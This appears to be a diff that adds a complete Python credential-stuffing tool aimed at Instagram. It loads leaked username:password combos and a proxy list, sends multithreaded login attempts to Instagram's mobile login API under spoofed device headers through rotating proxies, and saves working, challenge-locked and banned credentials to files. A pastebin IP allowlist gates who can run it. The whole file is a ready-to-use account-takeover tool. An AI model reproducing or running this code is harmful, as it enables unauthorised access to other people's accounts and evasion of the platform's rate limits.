@@ -1,0 +1,245 @@
+der = 0
+banned = 0
+os.system('mode con: cols=106 lines=21')
+try:
+    TEXT = requests.get('https://pastebin.com/raw/NKuYUPva').text
+    GetIP = requests.get('https://api.ipify.org?format=json').text
+    GETIP = re.findall('{"ip":"(.*?)"}', GetIP)
+    IP = " ".join(GETIP)
+    if IP in TEXT:
+        pass
+    else:
+        input(f'Sorry You Can Not Access To This Tool [{IP}]')
+except:
+    os._exit(1)
+print("""
+
+
+         █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗      ██████╗ ██╗   ██╗███████╗███████╗███████╗
+        ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██║   ██║██╔════╝██╔════╝██╔════╝
+        ███████║██║     ██████╔╝███████║███████║    ██║  ███╗██║   ██║█████╗  ███████╗███████╗
+        ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║    ██║   ██║██║   ██║██╔══╝  ╚════██║╚════██║
+        ██║  ██║███████╗██║     ██║  ██║██║  ██║    ╚██████╔╝╚██████╔╝███████╗███████║███████║
+        ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝                                                                                  
+""")
+print("""""""""""")
+print('                                        | Chose Proxy Type |')
+print("")
+print('                                    ( 1 ) Http/s | ( 2 ) Socks4')
+print("")
+proxy_type = input(f'                                                 ')
+os.system('cls' if os.name == 'nt' else 'clear')
+print("""
+
+
+         █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗      ██████╗ ██╗   ██╗███████╗███████╗███████╗
+        ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██║   ██║██╔════╝██╔════╝██╔════╝
+        ███████║██║     ██████╔╝███████║███████║    ██║  ███╗██║   ██║█████╗  ███████╗███████╗
+        ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║    ██║   ██║██║   ██║██╔══╝  ╚════██║╚════██║
+        ██║  ██║███████╗██║     ██║  ██║██║  ██║    ╚██████╔╝╚██████╔╝███████╗███████║███████║
+        ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝                                                                                  
+""")
+print("""""""""""")
+print('                                        | Enter Threading |')
+print("")
+Threadingg = input(f'                                                 ')
+os.system('cls' if os.name == 'nt' else 'clear')
+print("""
+
+
+         █████╗ ██╗     ██████╗ ██╗  ██╗ █████╗      ██████╗ ██╗   ██╗███████╗███████╗███████╗
+        ██╔══██╗██║     ██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██║   ██║██╔════╝██╔════╝██╔════╝
+        ███████║██║     ██████╔╝███████║███████║    ██║  ███╗██║   ██║█████╗  ███████╗███████╗
+        ██╔══██║██║     ██╔═══╝ ██╔══██║██╔══██║    ██║   ██║██║   ██║██╔══╝  ╚════██║╚════██║
+        ██║  ██║███████╗██║     ██║  ██║██║  ██║    ╚██████╔╝╚██████╔╝███████╗███████║███████║
+        ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝                                                                                  
+""")
+att, error, bad_proxy, secure, good = 0, 0, 0, 0, 0
+
+
+def RandomStringUpper(n=10):
+    letters = string.ascii_uppercase + '1234567890'
+    return ''.join(random.choice(letters) for i in range(n))
+
+
+def RandomString(n=10):
+    letters = string.ascii_lowercase + '1234567890'
+    return ''.join(random.choice(letters) for i in range(n))
+
+
+def RandomStringUpper(n=10):
+    letters = string.ascii_uppercase + '1234567890'
+    return ''.join(random.choice(letters) for i in range(n))
+
+
+def RandomStringChars(n=10):
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(n))
+
+
+def randomStringWithChar(stringLength=10):
+    letters = string.ascii_lowercase + '1234567890'
+    result = ''.join(random.choice(letters) for i in range(stringLength - 1))
+    return RandomStringChars(1) + result
+
+
+###########################################################login#######################################################
+def generateUSER_AGENT():
+    Devices_menu = ['HUAWEI', 'Xiaomi', 'samsung', 'OnePlus']
+    DPIs = [
+        '480', '320', '640', '515', '120', '160', '240', '800'
+    ]
+    randResolution = random.randrange(2, 9) * 180
+    lowerResolution = randResolution - 180
+    DEVICE_SETTINTS = {
+        'system': "Android",
+        'Host': "Instagram",
+        'manufacturer': f'{random.choice(Devices_menu)}',
+        'model': f'{random.choice(Devices_menu)}-{randomStringWithChar(4).upper()}',
+        'android_version': random.randint(18, 25),
+        'android_release': f'{random.randint(1, 7)}.{random.randint(0, 7)}',
+        "cpu": f"{RandomStringChars(2)}{random.randrange(1000, 9999)}",
+        'resolution': f'{randResolution}x{lowerResolution}',
+        'randomL': f"{RandomString(6)}",
+        'dpi': f"{random.choice(DPIs)}"
+    }
+    return '{Host} 155.0.0.37.107 {system} ({android_version}/{android_release}; {dpi}dpi; {resolution}; {manufacturer}; {model}; {cpu}; {randomL}; en_US)'.format(
+        **DEVICE_SETTINTS)
+
+
+try:
+    OPEN_PROXY = open('proxy.txt', 'r').read().splitlines()
+    OPEN_LIST = open('combo.txt', 'r').read().splitlines()
+
+except Exception as SW:
+    wer = str(SW).split('] ')[1]
+    print(f'< ! > {wer}')
+aa = []
+
+
+class setitings:
+    def __init__(self):
+        threads1 = []
+        TR = int(Threadingg)
+        for i in range(TR):
+            thread1 = threading.Thread(target=self.START)
+            thread1.start()
+            threads1.append(thread1)
+        for thread in threads1:
+            thread.join()
+        pass
+
+    def START(self):
+        global good, error, att, secure, bad_proxy, der, banned
+        for AS in OPEN_LIST:
+            if AS in aa:
+                pass
+            else:
+                aa.append(AS)
+                time.sleep(0.00000000000000001)
+                try:
+                    self.username = AS.split(':')[0]
+                    self.password = AS.split(':')[1]
+                except:
+                    pass
+                headers_Api = {
+                    'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
+                    "Accept": "*/*",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Accept-Language": "en-US",
+                    "X-IG-Capabilities": "3brTvw==",
+                    "X-IG-Connection-Type": "WIFI",
+                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                    'Host': 'i.instagram.com',
+                    'Connection': 'keep-alive'
+                }
+                url_Api = 'https://i.instagram.com/api/v1/accounts/login/'
+                data_Api = {
+                    'uuid': uuid.uuid4(),
+                    'password': self.password,
+                    'username': self.username,
+                    'device_id': uuid.uuid4(),
+                    'from_reg': 'false',
+                    '_csrftoken': 'missing',
+                    'login_attempt_countn': '0'
+                }
+                if proxy_type == '1':
+                    proxq = random.choice(OPEN_PROXY)
+                    proxy = {'http': f"http://{proxq}", 'https': f"http://{proxq}"}
+                if proxy_type == '2':
+                    proxq = random.choice(OPEN_PROXY)
+                    proxy = {
+                        "http": f'socks4://{proxq}',
+                        "https": f'socks4://{proxq}'
+                    }
+                try:
+                    self.login = requests.post(url_Api, headers=headers_Api, data=data_Api, proxies=proxy).text
+                    if ('Please check your username and try again.') in self.login:
+                        att += 1
+                        ctypes.windll.kernel32.SetConsoleTitleW(
+                            f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+
+                    elif ('The password you entered is incorrect') in self.login:
+                        att += 1
+                        ctypes.windll.kernel32.SetConsoleTitleW(
+                            f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+
+                    elif ('Please wait a few minutes before you try again.') in self.login:
+                        bad_proxy += 1
+                        ctypes.windll.kernel32.SetConsoleTitleW(
+                            f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+
+                    elif ('challenge_required') in self.login:
+                        secure += 1
+                        ctypes.windll.kernel32.SetConsoleTitleW(
+                            f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+
+                        with open('secure.txt', 'a') as sss:
+                            sss.write(f'{self.username}:{self.password}\n')
+                    elif ('logged_in_user') in self.login:
+                        good += 1
+                        ctypes.windll.kernel32.SetConsoleTitleW(
+                            f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+
+                        with open('good.txt', 'a') as sss:
+                            sss.write(f'{self.username}:{self.password}\n')
+                    elif ('your account was disabled') in self.login:
+                        banned += 1
+                        ctypes.windll.kernel32.SetConsoleTitleW(
+                            f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+                        with open('banned.txt', 'a') as sss:
+                            sss.write(f'{self.username}:{self.password}\n')
+                    else:
+                        error += 1
+                        ctypes.windll.kernel32.SetConsoleTitleW(
+                            f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+
+                        with open('else.txt', 'a') as sss:
+                            sss.write(f'{self.username}:{self.password}:{self.login}\n')
+                except:
+                    bad_proxy += 1
+                    ctypes.windll.kernel32.SetConsoleTitleW(
+                        f'[Not Working : {att}] [bad proxy : {bad_proxy}] [secure : {secure}] [good : {good}] [banned : {banned}] [else : {error}]')
+
+        if der == 0:
+            der = 1
+            print("""
+
+
+         ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄           ▄████  █    ██ ▓█████   ██████   ██████ 
+        ▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒▒████▄        ██▒ ▀█▒ ██  ▓██▒▓█   ▀ ▒██    ▒ ▒██    ▒ 
+        ▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄     ▒██░▄▄▄░▓██  ▒██░▒███   ░ ▓██▄   ░ ▓██▄   
+        ░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██    ░▓█  ██▓▓▓█  ░██░▒▓█  ▄   ▒   ██▒  ▒   ██▒
+         ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒   ░▒▓███▀▒▒▒█████▓ ░▒████▒▒██████▒▒▒██████▒▒
+         ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░    ░▒   ▒ ░▒▓▒ ▒ ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
+          ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░     ░   ░ ░░▒░ ░ ░  ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░
+          ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒      ░ ░   ░  ░░░ ░ ░    ░   ░  ░  ░  ░  ░  ░  
+              ░  ░    ░  ░          ░  ░  ░      ░  ░         ░    ░        ░  ░      ░        ░                                                                                       
+            """)
+            print("""""""""""")
+            print('                                  | All Usernames Has Been Checked | ')
+            input(f'                                                  ')
+
+
+setitings()
+
